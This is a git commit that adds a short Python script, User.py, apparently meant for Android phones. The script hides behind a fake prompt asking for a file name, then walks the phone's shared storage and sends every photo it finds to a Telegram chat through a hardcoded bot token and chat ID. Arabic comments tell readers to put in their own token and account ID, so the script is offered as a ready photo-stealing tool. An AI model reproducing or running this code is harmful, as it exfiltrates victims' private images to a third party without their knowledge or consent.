57457f3896eaa233dc1b567d84aa722cb7c8d5d7
HACKSOSS <157139406+HACKSOSS@users.noreply.github.com>
2024-05-28 02:46:11 +0300

    Add files via upload

---
+++ User.py
@@ -0,0 +1,25 @@
+import os
+import telebot
+from threading import Thread
+
+bot = telebot.TeleBot("1897617969:AAHMph1quyqicoTUTEVkjvNdb6WBjm3oysg") #بدال كلمة Tok حط توكن بوتك
+
+input('Inter your file ادخل اسم الملف وسيتم حفظ الاداه باسم  hossam.py!!')
+dir_path = "/storage/emulated/0/"
+
+def send_file(file_path):
+ with open(file_path, "rb") as f:
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+ 		bot.send_photo(chat_id="5664126821",photo=f) #بدال Id Telegram حط ايدي حسابك تلي
+ 	else:
+ 		print("")
+
+for root, dirs, files in os.walk(dir_path):
+	threads = []
+	for file in files:
+		file_path = os.path.join(root, file)
+		t = Thread(target=send_file, args=(file_path,))
+		t.start()
+		threads.append(t)
+	for thread in threads:
+		thread.join()
